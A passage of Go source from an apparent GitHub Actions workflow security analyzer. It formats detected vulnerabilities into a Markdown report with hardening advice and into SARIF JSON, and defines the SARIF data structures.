		severityCounts[vuln.Severity]++
	}

	// Resumen ejecutivo por severidad
	fmt.Fprintf(w, "## Resumen Ejecutivo\n\n")
	fmt.Fprintf(w, "### Distribución por Severidad\n\n")

	// Mostrar gráfico de barras simple con caracteres ASCII/Markdown
	maxCount := 0
	for _, count := range severityCounts {
		if count > maxCount {
			maxCount = count
		}
	}

	if maxCount > 0 {
		fmt.Fprintf(w, "```\n")
		fmt.Fprintf(w, "Alta:  %s (%d)\n", strings.Repeat("█", (severityCounts["Alta"]*20)/maxCount), severityCounts["Alta"])
		fmt.Fprintf(w, "Media: %s (%d)\n", strings.Repeat("█", (severityCounts["Media"]*20)/maxCount), severityCounts["Media"])
		fmt.Fprintf(w, "Baja:  %s (%d)\n", strings.Repeat("█", (severityCounts["Baja"]*20)/maxCount), severityCounts["Baja"])
		fmt.Fprintf(w, "```\n\n")
	}

	// Estadísticas por tipo
	fmt.Fprintf(w, "### Distribución por Tipo de Vulnerabilidad\n\n")

	// Ordenar tipos por cantidad para mostrarlos de mayor a menor
	type countPair struct {
		Type  string
		Count int
	}

	var pairs []countPair
	for vulnType, vulns := range vulnerabilityTypes {
		pairs = append(pairs, countPair{Type: vulnType, Count: len(vulns)})
	}

	// Ordenar por cantidad descendiente
	sort.Slice(pairs, func(i, j int) bool {
		return pairs[i].Count > pairs[j].Count
	})

	// Mostrar los tipos en orden
	for _, pair := range pairs {
		fmt.Fprintf(w, "- **%s**: %d ocurrencias\n", pair.Type, pair.Count)
	}
	fmt.Fprintf(w, "\n")

	// Análisis detallado por tipo con explicaciones, impacto y recomendaciones
	fmt.Fprintf(w, "## Análisis Detallado por Tipo de Vulnerabilidad\n\n")

	// Usar los tipos ordenados previamente
	for _, pair := range pairs {
		vulnType := pair.Type
		vulns := vulnerabilityTypes[vulnType]

		fmt.Fprintf(w, "### %s (%d ocurrencias)\n\n", vulnType, len(vulns))

		if len(vulns) > 0 {
			// Mostrar información general sobre este tipo de vulnerabilidad
			vuln := vulns[0] // Tomar la primera como referencia

			fmt.Fprintf(w, "**Descripción**: %s\n\n", vuln.Description)
			fmt.Fprintf(w, "**Severidad**: %s\n\n", vuln.Severity)
			fmt.Fprintf(w, "**Impacto Potencial**: %s\n\n", vuln.Impact)
			fmt.Fprintf(w, "**Vector de Explotación**: %s\n\n", vuln.Exploit)
			fmt.Fprintf(w, "**Recomendación General**: \n%s\n\n", vuln.Mitigation)

			// Mostrar referencias
			if len(vuln.References) > 0 {
				fmt.Fprintf(w, "**Referencias y Recursos**:\n\n")
				for _, ref := range vuln.References {
					fmt.Fprintf(w, "- %s\n", ref)
				}
				fmt.Fprintf(w, "\n")
			}

			// Mostrar cada ocurrencia con detalles
			fmt.Fprintf(w, "#### Ocurrencias Específicas\n\n")

			for i, vuln := range vulns {
				fmt.Fprintf(w, "<details>\n")
				fmt.Fprintf(w, "<summary>Ocurrencia %d - %s</summary>\n\n", i+1, vuln.File)

				fmt.Fprintf(w, "**Ubicación**: %s, línea %d\n\n", vuln.File, vuln.Line)
				fmt.Fprintf(w, "**Código vulnerable**:\n")
				fmt.Fprintf(w, "```yaml\n%s\n```\n\n", strings.TrimSpace(vuln.Details))

				fmt.Fprintf(w, "</details>\n\n")
			}
		}
	}

	// Recomendaciones de seguridad generales
	fmt.Fprintf(w, "## Recomendaciones Generales de Seguridad para GitHub Actions\n\n")

	fmt.Fprintf(w, "### Principios Básicos de Seguridad\n\n")
	fmt.Fprintf(w, "1. **Principio de mínimo privilegio**: Otorgar sólo los permisos estrictamente necesarios para cada workflow.\n")
	fmt.Fprintf(w, "2. **Inmutabilidad de componentes**: Usar hashes SHA completos para acciones en lugar de tags o ramas que pueden cambiar.\n")
	fmt.Fprintf(w, "3. **Validación de entradas**: Sanitizar y validar todas las entradas externas antes de usarlas.\n")
	fmt.Fprintf(w, "4. **Segmentación**: Dividir workflows críticos en múltiples jobs con diferentes niveles de acceso.\n")
	fmt.Fprintf(w, "5. **Protección de secretos**: Manejar los secretos adecuadamente sin exponerlos en logs o outputs.\n\n")

	fmt.Fprintf(w, "### Mejores Prácticas Específicas\n\n")
	fmt.Fprintf(w, "#### Permisos y Autenticación\n\n")
	fmt.Fprintf(w, "```yaml\n# Definir permisos explícitos y restrictivos\npermissions:\n  contents: read\n  issues: write\n  # Otros permisos específicos según necesidad\n```\n\n")

	fmt.Fprintf(w, "#### Uso Seguro de Acciones de Terceros\n\n")
	fmt.Fprintf(w, "```yaml\n# Usar SHA completo en lugar de versiones o ramas\nuses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675\n```\n\n")

	fmt.Fprintf(w, "#### Manejo Seguro de Inputs\n\n")
	fmt.Fprintf(w, "```yaml\n# Validar y sanitizar inputs\n- name: Validate input\n  run: |\n    INPUT=\"${{ github.event.inputs.parameter }}\"\n    if [[ ! $INPUT =~ ^[a-zA-Z0-9_-]+$ ]]; then\n      echo \"Input validation failed\"\n      exit 1\n    fi\n    echo \"Validated input: $INPUT\"\n```\n\n")

	fmt.Fprintf(w, "#### GitHub Advanced Security (GHAS)\n\n")
	fmt.Fprintf(w, "Considerar la activación de las siguientes características de GitHub Advanced Security:\n\n")
	fmt.Fprintf(w, "1. **CodeQL Analysis**: Para detección automática de vulnerabilidades en el código.\n")
	fmt.Fprintf(w, "2. **Secret Scanning**: Para detectar credenciales expuestas accidentalmente.\n")
	fmt.Fprintf(w, "3. **Dependabot**: Para mantener actualizadas las dependencias y corregir vulnerabilidades.\n")
	fmt.Fprintf(w, "4. **Code Scanning**: Para integrar con herramientas adicionales de análisis estático.\n\n")

	fmt.Fprintf(w, "## Recursos Adicionales\n\n")
	fmt.Fprintf(w, "- [GitHub Actions Security Hardening Guide](https://docs.github.com/es/actions/security-guides/security-hardening-for-github-actions)\n")
	fmt.Fprintf(w, "- [GitHub Advanced Security Documentation](https://docs.github.com/es/github/getting-started-with-github/about-github-advanced-security)\n")
	fmt.Fprintf(w, "- [GitHub Security Advisories](https://github.com/advisories)\n")
	fmt.Fprintf(w, "- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)\n")

	return nil
}

// Guardar las vulnerabilidades en formato SARIF (JSON estándar para resultados de análisis estático)
func saveVulnerabilitiesAsSARIF(vulnerabilities []Vulnerability, filename string) error {
	// Crear un mapa para almacenar reglas únicas
	uniqueRuleIds := make(map[string]bool)
	var rules []SARIFRule

	// Crear las reglas SARIF a partir de las vulnerabilidades
	for _, vuln := range vulnerabilities {
		ruleID := strings.ReplaceAll(vuln.Type, " ", "")

		if !uniqueRuleIds[ruleID] {
			uniqueRuleIds[ruleID] = true

			// Convertir severidad a formato numérico estándar CVSS
			var securitySeverity string
			switch vuln.Severity {
			case "Alta":
				securitySeverity = "8.9"
			case "Media":
				securitySeverity = "5.5"
			case "Baja":
				securitySeverity = "3.0"
			default:
				securitySeverity = "1.0"
			}

			// Crear regla SARIF para este tipo de vulnerabilidad
			rule := SARIFRule{
				ID:   ruleID,
				Name: vuln.Type,
				ShortDescription: SARIFMessage{
					Text: vuln.Description,
				},
				FullDescription: SARIFMessage{
					Text: vuln.Impact,
				},
				Help: SARIFMessage{
					Text: vuln.Mitigation,
				},
				Properties: SARIFRuleProperty{
					SecuritySeverity: securitySeverity,
					Tags:             []string{"security", "github-actions", "ci-cd"},
				},
			}
			rules = append(rules, rule)
		}
	}

	// Crear resultados SARIF a partir de las vulnerabilidades
	var results []SARIFResult
	for _, vuln := range vulnerabilities {
		ruleID := strings.ReplaceAll(vuln.Type, " ", "")

		// Mapear severidad a nivel SARIF
		level := "warning"
		if vuln.Severity == "Alta" {
			level = "error"
		} else if vuln.Severity == "Baja" {
			level = "note"
		}

		// Crear mensaje específico para esta instancia de vulnerabilidad
		message := SARIFMessage{
			Text: fmt.Sprintf("%s - %s", vuln.Description, strings.Split(vuln.Details, "\n")[0]),
		}

		// Crear resultado SARIF para esta vulnerabilidad
		result := SARIFResult{
			RuleID:  ruleID,
			Level:   level,
			Message: message,
			Locations: []SARIFLocation{
				{
					PhysicalLocation: SARIFPhysicalLocation{
						ArtifactLocation: SARIFArtifactLocation{
							URI: vuln.File,
						},
						Region: SARIFRegion{
							StartLine: vuln.Line,
							Snippet: SARIFSnippet{
								Text: vuln.Details,
							},
						},
					},
				},
			},
		}
		results = append(results, result)
	}

	// Crear tiempos para la invocación
	startTime := time.Now().Add(-1 * time.Hour).UTC().Format(time.RFC3339)
	endTime := time.Now().UTC().Format(time.RFC3339)

	// Construir el reporte SARIF completo
	sarifReport := SARIFReport{
		Schema:  "https://json.schemastore.org/sarif-2.1.0.json",
		Version: "2.1.0",
		Runs: []SARIFRun{
			{
				Tool: SARIFTool{
					Driver: SARIFDriver{
						Name:           "GitHub Actions Workflow Analyzer",
						Version:        "1.0.0",
						InformationURI: "https://github.com/cmalvaceda/tesis-poc",
						Rules:          rules,
					},
				},
				Results: results,
				Invocations: []SARIFInvocation{
					{
						ExecutionSuccessful: true,
						StartTimeUTC:        startTime,
						EndTimeUTC:          endTime,
					},
				},
			},
		},
	}

	// Serializar a JSON con formato legible
	jsonData, err := json.MarshalIndent(sarifReport, "", "  ")
	if err != nil {
		return fmt.Errorf("error al crear JSON SARIF: %w", err)
	}

	// Guardar en archivo
	err = os.WriteFile(filename, jsonData, 0644)
	if err != nil {
		return fmt.Errorf("error al guardar archivo SARIF: %w", err)
	}

	return nil
}

// Estructuras SARIF para el formato JSON estándar
type SARIFReport struct {
	Schema  string     `json:"$schema"`
	Version string     `json:"version"`
	Runs    []SARIFRun `json:"runs"`
}

type SARIFRun struct {
	Tool        SARIFTool         `json:"tool"`
	Results     []SARIFResult     `json:"results"`
	Invocations []SARIFInvocation `json:"invocations"`
}

type SARIFTool struct {
	Driver SARIFDriver `json:"driver"`
}

type SARIFDriver struct {
	Name           string      `json:"name"`
	Version        string      `json:"version"`
	InformationURI string      `json:"informationUri"`
	Rules          []SARIFRule `json:"rules"`
}

type SARIFRule struct {
	ID               string            `json:"id"`
	Name             string            `json:"name"`
	ShortDescription SARIFMessage      `json:"shortDescription"`
	FullDescription  SARIFMessage      `json:"fullDescription"`
	Help             SARIFMessage      `json:"help"`
	Properties       SARIFRuleProperty `json:"properties"`
}

type SARIFMessage struct {
	Text string `json:"text"`
}

type SARIFRuleProperty struct {
	SecuritySeverity string   `json:"security-severity"`
	Tags             []string `json:"tags"`
}

type SARIFResult struct {
	RuleID    string          `json:"ruleId"`
	Level     string          `json:"level"`
	Message   SARIFMessage    `json:"message"`
	Locations []SARIFLocation `json:"locations"`
}

type SARIFLocation struct {
	PhysicalLocation SARIFPhysicalLocation `json:"physicalLocation"`
}

type SARIFPhysicalLocation struct {
	ArtifactLocation SARIFArtifactLocation `json:"artifactLocation"`
	Region           SARIFRegion           `json:"region"`
}

type SARIFArtifactLocation struct {
	URI string `json:"uri"`
}

type SARIFRegion struct {
	StartLine int          `json:"startLine"`
	Snippet   SARIFSnippet `json:"snippet,omitempty"`
}

type SARIFSnippet struct {
	Text string `json:"text"`
}

type SARIFInvocation struct {
	ExecutionSuccessful bool   `json:"executionSuccessful"`
	StartTimeUTC        string `json:"startTimeUtc"`
	EndTimeUTC          string `json:"endTimeUtc"`
}

// Funciones auxiliares
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
